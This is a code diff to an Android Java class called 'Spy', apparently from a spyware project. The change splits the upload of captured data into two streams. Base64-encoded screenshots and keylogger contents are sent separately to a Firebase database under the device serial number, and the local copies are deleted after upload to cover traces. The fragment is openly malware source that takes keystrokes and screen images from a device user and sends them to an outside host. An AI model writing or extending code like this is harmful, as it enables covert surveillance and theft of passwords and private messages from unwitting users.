@@ -13,6 +13,7 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.util.ArrayList;
 import java.util.Date;
 import javax.net.ssl.HttpsURLConnection;
 
@@ -40,34 +41,62 @@ public class Spy {
         try {
             FileUtil fileUtil = FileUtil.getInstance();
             String userIdentifier = android.os.Build.class.getField("SERIAL").get(null).toString();
-            String directory = "/user/" + userIdentifier + "/" + (new Date()).getTime() + ".json";
+            String rootDirectory = "/user/SERIAL_" + userIdentifier + "/SUBMITDATE_" + (new Date()).getTime();
+            String screenshotSubFolder = rootDirectory + "/BASE64Screenshots" + ".json";
+            String keypressSubFolder = rootDirectory + "/KEYPRESS" + ".json";
 
-            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL() + directory);
-            HttpsURLConnection urlConnection = getConnection(databaseURL);
+            JSONObject screenshotJSONObject = new JSONObject();
+            URL screenshotURL = new URL(FirebaseConfig.getDatabaseURL() + screenshotSubFolder);
+            HttpsURLConnection screenshotUrlConnection = getConnection(screenshotURL);
+            ArrayList<File> screenshotFiles = fileUtil.getAllImagesFrom(fileUtil.getMalwareImagesStorageFolder());
 
-            JSONObject jsonObject = new JSONObject();
 
-            for (File file: FileUtil.getInstance().getAllImagesFrom(fileUtil.getMalwareImagesStorageFolder())) {
-                jsonObject.put(file.getName().split("\\.")[0].toLowerCase(), base64Encoding(file));
+            if(screenshotFiles != null && !screenshotFiles.isEmpty()) {
+
+                for (File file : screenshotFiles) {
+                    screenshotJSONObject.put(file.getName().replace(".","_").toLowerCase(), base64Encoding(file));
+                }
+
+                setPostRequestContent(screenshotUrlConnection, screenshotJSONObject);
+                screenshotUrlConnection.connect();
+
+                int responseCode = screenshotUrlConnection.getResponseCode();
+
+                Log.d("Spy", "Database response code: " + responseCode);
+
+                if(responseCode == 200){
+                    fileUtil.deleteScreenshotFiles();
+                    Log.d("Spy", "Screenshots deleted");
+                }
+                screenshotUrlConnection.disconnect();
             }
 
+            JSONObject keypressJSONObject = new JSONObject();
+            URL keypressURL = new URL(FirebaseConfig.getDatabaseURL() + keypressSubFolder);
+            HttpsURLConnection keypressUrlConnection = getConnection(keypressURL);
             String keypressFileContent = fileUtil.getStringFromKeypressFile();
 
-            if(keypressFileContent != null)
-                jsonObject.put("Keylog", keypressFileContent);
+            if(keypressFileContent != null && !keypressFileContent.equals("")) {
+                keypressJSONObject.put("Keylog", keypressFileContent);
 
-            setPostRequestContent(urlConnection, jsonObject);
-            urlConnection.connect();
+                setPostRequestContent(keypressUrlConnection, keypressJSONObject);
+                keypressUrlConnection.connect();
 
-            int responseCode = urlConnection.getResponseCode();
+                int responseCode = keypressUrlConnection.getResponseCode();
 
-            Log.d("Spy", "Database response code: " + responseCode);
+                Log.d("Spy", "Database response code: " + responseCode);
 
-            if(responseCode == 200){
-                fileUtil.deleteAllFiles();
-                Log.d("Spy", "Files deleted");
+                if(responseCode == 200){
+                    fileUtil.deleteKeypressFile();
+                    Log.d("Spy", "Keypress deleted");
+                }
+                keypressUrlConnection.disconnect();
+
             }
-            urlConnection.disconnect();
+
+
+
+
 
         } catch (MalformedURLException e) {
             e.printStackTrace();
